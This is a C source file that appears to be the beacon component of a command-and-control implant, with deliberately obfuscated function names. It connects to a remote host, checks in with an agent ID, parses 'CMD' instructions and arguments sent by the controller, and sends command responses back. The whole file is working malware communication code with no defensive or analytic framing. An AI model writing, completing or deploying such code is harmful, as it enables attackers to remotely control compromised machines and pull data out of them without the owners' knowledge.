#include "beacon.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
static int zvxqbtnm(const char *host, int port) {
    struct hostent *he = gethostbyname(host);
    if (!he) return -1;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);
    memcpy(&addr.sin_addr, he->h_addr_list[0], (size_t)he->h_length);
    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        close(s); return -1;
    }
    return s;
}
static void mxqvntbr(int s, const char *buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        ssize_t n = send(s, buf + sent, len - sent, 0);
        if (n <= 0) break;
        sent += (size_t)n;
    }
}
int nqvxbrtm(const char *host, int port,
                   const char *agent_id, BXQVTNMR *out) {
    int s = zvxqbtnm(host, port);
    if (s < 0) return -1;
    char msg[256];
    int  mlen = snprintf(msg, sizeof(msg), "CHECKIN %s\n", agent_id);
    mxqvntbr(s, msg, (size_t)mlen);
    char buf[4096] = {0};
    ssize_t n = recv(s, buf, sizeof(buf)-1, 0);
    close(s);
    if (n <= 0) return -1;
    buf[n] = '\0';
    if (strncmp(buf, "IDLE", 4) == 0) return 0;
    if (strncmp(buf, "CMD ", 4) == 0) {
        char *p = buf + 4;
        char *sp = strchr(p, ' ');
        if (sp) {
            size_t clen = (size_t)(sp - p);
            if (clen >= sizeof(out->cmd)) clen = sizeof(out->cmd)-1;
            memcpy(out->cmd, p, clen);
            out->cmd[clen] = '\0';
            strncpy(out->arg, sp+1, sizeof(out->arg)-1);
            size_t alen = strlen(out->arg);
            if (alen > 0 && out->arg[alen-1] == '\n') out->arg[alen-1] = '\0';
        } else {
            strncpy(out->cmd, p, sizeof(out->cmd)-1);
            out->arg[0] = '\0';
        }
        return 1;
    }
    return -1;
}
void kxvqtnbr(const char *host, int port,
                    const char *agent_id, const char *response) {
    int s = zvxqbtnm(host, port);
    if (s < 0) return;
    size_t rlen = strlen(response);
    size_t mlen = strlen(agent_id) + rlen + 32;
    char  *msg  = malloc(mlen);
    if (!msg) { close(s); return; }
    int n = snprintf(msg, mlen, "RESP %s %s\n", agent_id, response);
    mxqvntbr(s, msg, (size_t)n);
    free(msg);
    close(s);
}
